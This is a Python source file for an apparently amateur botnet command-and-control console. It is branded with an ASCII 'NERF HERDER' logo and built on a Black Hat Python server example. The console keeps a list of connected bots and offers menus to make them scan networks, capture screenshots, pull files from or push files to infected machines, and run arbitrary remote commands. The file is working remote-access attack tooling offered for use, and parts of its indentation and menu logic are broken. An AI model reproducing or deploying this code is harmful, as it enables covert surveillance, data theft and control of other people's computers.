import socket
import threading
import subprocess
import sys
import os
from xml.dom import minidom
import webbrowser

bind_host = '0.0.0.0'
bind_port = 9990

send_host = '127.0.0.1'
send_port = 6660

# ---------- TCP Server ---------- #
# Code example from Black Hat Python, written by Justin Seitz and published by No Starch Press
# TCP server to accept messages from bot, runs as a thread

# Create the socket to listen on for TCP, set the IP and port (0.0.0.0 means any I think?)
# 5 is max backlogged connections
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_host, bind_port))
server.listen(10)


def handle_client(client_socket):
    # Handles a client when the connect, called by the server, async

    request = client_socket.recv(1024)  # 1024 is the buffer size

    print("[*-->Command Received")
    print(request)

    if request == '[*-->online':
        add_bot(client_socket)

    client_socket.close()


# This function starts the actual server
def the_server():
    while True:
        client, addr = server.accept()
        print('[*--> Accepted connection from %s:%d' % (addr[0], addr[1]))

        # Client thread handling for incoming data
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()


# Starts up the tcp receiver, makes it a separate thread so it can listen while being used
server_handler = threading.Thread(target=the_server, args=())
server_handler.start()

# ---------- END OF SERVER ---------- #


# ---------- FUNCTIONS ---------- #
def view_bots():
    # Function to view the existing bots in database

    # Open the file as XML, and get all the bots that exist
    bot_list = minidom.parse('bots.xml')
    bots = bot_list.getElementsByTagName('bot')

    # Loop to print the bots
    for bot in bots:
        print('Bot %s' % bot.attributes['id'].value)
        print('[*--> IP: %s' % bot.attributes['ip'].value)
        print('[*--> MAC: %s' % bot.attributes['mac'].value)
        print('[*--> OS: %s' % bot.attributes['os'].value)
        print('-' * 30)
        print('')


def add_bot(client):
    # Add a bot to the database

    client.send('[*-->ok')

    ip = client.recv(1024)
    mac = client.recv(1024)
    os = client.recv(1024)

    print('[*-->New bot connection \n\tip:%s\n\tmac:%s\n\tos:%s' % (ip, mac, os))
    # Open the file as XML, and get all the bots that exist
    bot_list = minidom.parse('bots.xml')
    bots = bot_list.getElementsByTagName('bot')

    # Create a new bot and set it's attributes. Currently static
    new_bot = bot_list.createElement('bot')
    new_bot.setAttribute('id', str(len(bots)))
    new_bot.setAttribute('ip', ip)
    new_bot.setAttribute('mac', mac)
    new_bot.setAttribute('os', os)

    bot_list.getElementsByTagName('root')[0].appendChild(new_bot)
    my_file = open('bots.xml', 'w')
    my_file.write(bot_list.toxml())
    my_file.close()

    print('[*--> Bot was added')
    print('>>> \n')


def end():
    # Terminates the execution

    exit(0)


def choice_error():
    # Print an error message in case the user selects a wrong action.

    print('Choice does not exist')

def main_menu():
    logo()
    # Print a menu with all the functionality.
    # Returns:
        # The choice of the user.

    # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
    print'MAIN MENU\n'
    descriptions = ['DEVICE SCANNING',
                    'MONITORING',
                    'ARCHIVE VIEWING',
                    'EXIT']

    # Prints the number (as num) and function name (as func) from array.
    # Enumerate puts numbers to each list item (so num works)
    for num, func in enumerate(descriptions):
        print('[%d--> %s' % (num, func))

    choice = input('>>> \n')
    print('')
    return choice



def mon_menu():  
    # Print a menu with all the functionality.
    # Returns:
        # The choice of the user.

    # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
    print'MONITOR\n'
    descriptions = ['Take Screenshots',
                    'Get File',
                    'Send File',                   
                    'Bot CMD',
                    'Back To Main Menu']

    # Prints the number (as num) and function name (as func) from array.
    # Enumerate puts numbers to each list item (so num works)
    for num, func in enumerate(descriptions):
        print('[%d--> %s' % (num, func))

    choice = input('>>> \n')
    print('')
    return choice

def scan_menu():
    # Print a menu with all the functionality.
    # Returns:
        # The choice of the user.

    # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
    print'SCAN FOR DEVICES\n'
    descriptions = ['Bot Scan',
                    'Add Bot',
                    'Back To Main Menu']

    # Prints the number (as num) and function name (as func) from array.
    # Enumerate puts numbers to each list item (so num works)
    for num, func in enumerate(descriptions):
        print('[%d--> %s' % (num, func))

    choice = input('>>> \n')
    print('')
    return choice

def arch_menu():
    
    # Print a menu with all the functionality.
    # Returns:
        # The choice of the user.

    # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
    print'ARCHIVE VIEWING\n'
    descriptions = ['View Bot Archive',
                    'View Archives in Folder',
                    'Delete Archive',                    
                    'Back To Main Menu']

    # Prints the number (as num) and function name (as func) from array.
    # Enumerate puts numbers to each list item (so num works)
    for num, func in enumerate(descriptions):
        print('[%d--> %s' % (num, func))

    choice = input('>>> \n')
    print('')
    return choice



def send_cmd(cmd):
    # Sends a command to a bot, invoked from other functions who's end result is pushing a command

    # create a socket object
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connect the client
    client.connect((send_host, send_port))

    client.send('[*-->cmd')

    if client.recv(1024) == '[*-->ok':
        client.send(cmd)

        if client.recv(1024) == '[*-->success':
            print('[*-->Success')
            print(client.recv(1024))
        elif client.recv(1024) == '[*-->failure':
            print('[*-->Failure')
            print(client.recv(1024))


def send_file(the_file):
    client = socket.socket()
    client.connect((send_host, send_port))

    client.send('[*-->file_recv')

    if client.recv(1024) == '[*-->ok':
        client.send(the_file)

    if client.recv(1024) == '[*-->ok':
        target_file = open(the_file, 'rb')
        file_stream = target_file.read(1024)
        while file_stream:
            print('Sending...')
            client.send(file_stream)
            file_stream = target_file.read(1024)

    client.shutdown(socket.SHUT_WR)
    client.close()
    print('>>> ')


def get_file(the_file):
    client = socket.socket()
    client.connect((send_host, send_port))
    client.send('[*-->file_deliv')

    if client.recv(1024) == '[*-->ok':
        client.send(the_file)

    if client.recv(1024) == '[*-->ok':
        client.send('[*-->start')
        print ("Receiving...")
        recv_file = open(the_file, 'wb')
        file_stream = client.recv(1024)

        while file_stream:
            print ("Receiving...")
            recv_file.write(file_stream)
            file_stream = client.recv(1024)

        print('[*-->screen get')
        print('>>> ')


def do_scan(ip_to_scan):
    # create a socket object
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connect the client
    client.connect((send_host, send_port))
    client.send('[*-->scan')

    if client.recv(1024) == '[*-->ok':
        client.send(ip_to_scan)


def take_ss():
    # create a socket object
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connect the client
    client.connect((send_host, send_port))
    client.send('[*-->take_screen')


    if client.recv(1024) == '[*-->ok':
        client.send('[*-->start')
        print ("Receiving...")
        recv_file = open('screen.png', 'wb')
        file_stream = client.recv(1024)
	print ("Receiving...")
        while file_stream:
            
            recv_file.write(file_stream)
            file_stream = client.recv(1024)

        print('[*-->screen get')
        print('>>> ')

# ---------- END FUNCTIONS ---------- #


# ---------- SCRIPT LOGO ---------- #

def logo():
	os.system('clear')
	print("     ******************************************************************************************************************************************************************")
	print("     *                                                                                                                                                                *")
	print("     *                                                                                                                                                                *")
	print("     *            NNN           NNN   EEEEEEEEEEE  RRRRRRRRRR       FFFFFFFFFFFF                                                                                      *")
	print("     *            NNNNN         NNN   EEEEEEEEEEE  RRRRRRRRRRRR     FFFFFFFFFFFF                                                                                      *")
	print("     *            NNN  NN       NNN   EEE          RRR        RRR   FFF                                                                                               *")
	print("     *            NNN   NN      NNN   EEE          RRR         RRR  FFF                                                                                               *")
	print("     *            NNN    NN     NNN   EEE          RRR         RRR  FFF                                                                                               *")
	print("     *            NNN     NN    NNN   EEE          RRR        RRR   FFF                                                                                               *")
	print("     *            NNN      NN   NNN   EEEEEE       RRRRRRRRRRRR     FFFFFF                                                                                            *")
	print("     *            NNN       NN  NNN   EEEEEE       RRRRRRRRRR       FFFFFF                                                                                            *")
	print("     *            NNN        NN NNN   EEE          RRR      RRR     FFF                                                                                               *")
	print("     *            NNN         NNNNN   EEE          RRR       RRR    FFF                                                                                               *")
	print("     *            NNN          NNNN   EEE          RRR        RRR   FFF                                                                                               *")
	print("     *            NNN           NNN   EEEEEEEEEEE  RRR        RRR   FFF                                                                                               *")
	print("     *            NNN           NNN   EEEEEEEEEEE  RRR         RRR  FFF                                                                                               *")
	print("     *                                                                                                                                                                *")
	print("     *                                                                                                                                                                *")
	print("     *                                                                                                                                                                *")
	print("     *                                             HHH         HHH   EEEEEEEEEEE   RRRRRRRRRR        DDDDDDDDD         EEEEEEEEEE    RRRRRRRRRR                       *")
	print("     *                                             HHH         HHH   EEEEEEEEEEE   RRRRRRRRRRRR      DDDDDDDDDDD       EEEEEEEEEE    RRRRRRRRRRRR                     *")
	print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD      DDD      EEE           RRR        RRR                   *")
	print("     *                                             HHH         HHH   EEE           RRR         RRR   DDD       DDD     EEE           RRR         RRR                  *")
	print("     *                                             HHH         HHH   EEE           RRR         RRR   DDD        DDD    EEE           RRR         RRR                  *")
	print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD         DDD   EEE           RRR        RRR                   *")
	print("     *                                             HHHHHHHHHHHHHHH   EEEEEE        RRRRRRRRRRRR      DDD         DDD   EEEEEE        RRRRRRRRRRRR                     *")
	print("     *                                             HHHHHHHHHHHHHHH   EEEEEE        RRRRRRRRRR        DDD         DDD   EEEEEE        RRRRRRRRRR                       *")
	print("     *                                             HHH         HHH   EEE           RRR      RRR      DDD        DDD    EEE           RRR      RRR                     *")
	print("     *                                             HHH         HHH   EEE           RRR       RRR     DDD       DDD     EEE           RRR       RRR                    *")
	print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD      DDD      EEE           RRR        RRR                   *")
	print("     *                                             HHH         HHH   EEEEEEEEEEE   RRR        RRR    DDDDDDDDDDD       EEEEEEEEEEE   RRR        RRR                   *")
	print("     *                                             HHH         HHH   EEEEEEEEEEE   RRR         RRR   DDDDDDDDD         EEEEEEEEEEE   RRR         RRR                  *")
	print("     *                                                                                                                                                                *")
	print("     *                                                                                                                                                                *")
	print("     ******************************************************************************************************************************************************************")

# --------- END OF SCRIPT LOGO ---------- #


# ---------- ITEM SELECTION TREE ---------- #
print("\n[*--> Listening on %s:%d\n" % (bind_host, bind_port))



while True:
    select = int(main_menu())

    if select == 0:
	logo()
	while True:
	    select_scan = int(scan_menu())

	    if select_scan == 0:  # Tell bot to Scan network
 		  ip_to_scan = raw_input('Enter a IP + CIDR (ex.: 192.168.1.0/24) >>> \n')
 		  do_scan(ip_to_scan)

 	    if select_scan == 1:  # View list of bots
 		view_bots()
   
	    if select_scan == 2:
		select = int(main_menu())		
		break
		  


    if select == 1:
	logo()
	while True:
		select_mon = int(mon_menu())

		if select_mon == 0:  # Tell bot to Screen Shot			
			print'Click...Got the Shot!!\n\n'
		        take_ss()	
			webbrowser.open('screen.png')
			print('\n\n\n')
			logo()
	
		if select_mon == 1:  # Get File
			#send_cmd('dir')
			#change_directory = raw_input('Choose the Directory >>> \n')
			#send_cmd('cd' + change_directory)
			print('List of All Files\n\n')
			send_cmd('tree')	
		        file_to_get = raw_input('Select The File to Get >>> \n')
		        get_file(file_to_get)

		if select_mon == 2:  # Send File
			files = [f for f in os.listdir('.') if os.path.isfile(f)]
			for f in files:
				print(f)	
		        file_to_send = raw_input('\nSelect The File to Send >>> \n')
		        send_file(file_to_send)

		if select_mon == 3:  # Tell bot to run a command
		        cmd_to_run = raw_input('CMD List (Examples)\nsleep\nls\ncd (dir)\ncat (filename)\ntree\nEnter the CMD >>>')
		        send_cmd(cmd_to_run)

		if select_mon == 4:
			select = int(main_menu())			
			break

    if select == 2:
	logo()
	while True:
		select_arch = int(arch_menu())

		if select_arch == 0:
			select = int(main_menu())			
			break

		if select_arch == 1:  # Exit the Script
			select = int(main_menu())			
			break
		if select_arch == 2:  # Exit the Script
			select = int(main_menu())			
			break
		if select_arch == 3:  # Exit the Script
			select = int(main_menu())			
			break

		if select_arch == 4:  # Exit the Script	
			select = int(main_menu())			
			break		
		        


    if select == 3:  # Exit the Script
        os._exit(1)

    else:
        choice_error()












# ---------- END OF SELECTION TREE ---------- #
